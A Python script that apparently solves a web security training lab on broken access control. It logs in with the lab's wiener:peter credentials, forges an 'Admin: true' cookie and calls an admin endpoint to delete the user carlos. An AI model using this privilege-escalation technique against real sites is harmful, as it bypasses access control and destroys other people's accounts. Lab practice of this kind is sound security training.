import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def post_method(s,url,data,path):
    try:
        r=s.post(url+path,data=data,verify=False, proxies=proxies)
        return r
    except Exception as e:
        print(colored(e,'red'))

def get_method(s,url,path,cookies):
    try:
        r = s.get(url+path, verify=False, proxies=proxies,cookies=cookies)
        return r
    except Exception as e:
        print(colored(e,'red'))

def get_csrf_token(s, url):

    path="/login"
    try:
        r = s.get(url+path, verify=False, proxies=proxies)
    except Exception as e:
        print(colored(e,'red'))

    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def CheckTheResulte(r,text,text2,condition,j):
    
    if j==0:
        if condition in r.text:
            print(colored(text,'green'))
        else:
            print(colored(text2,'red'))
            sys.exit(-1)
    else:
        if condition == r.status_code:
            print(colored(text,'green'))
        else:
            print(colored(text2,'red'))
            sys.exit(-1)

def exploit(s,url):
    csrf=get_csrf_token(s,url)

    data = {"csrf": csrf,
    "username": "wiener",
    "password": "peter"}

    r=post_method(s,url,data=data,path='/login')
    
    CheckTheResulte(r=r,text='(+) Successfully logged in as the wiener user.',text2='(-) Failed to login as the wiener user.',condition='Log out',j=0)
    session_cookie = s.cookies.get_dict().get('session')
    cookies = {'Admin': 'true', 'session': session_cookie}
    path='/admin/delete?username=carlos'
    # visite the admin panel and delete carlos user 
    r=get_method(s=s,url=url,path=path,cookies=cookies)
    CheckTheResulte(r=r,text='(+) Successfully deleted Carlos user.',text2='(-) Failed to delete Carlos user.',condition=200,j=1)

def main():
    banner(name='broken access control')
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    exploit(s,url=url)
    a="""  .-'''''-.
 ('    o o')
  |   '-'   |
  |  .-^-  |
   '-...-'
"""
    print(a)
   


    

if __name__ == "__main__":
    main()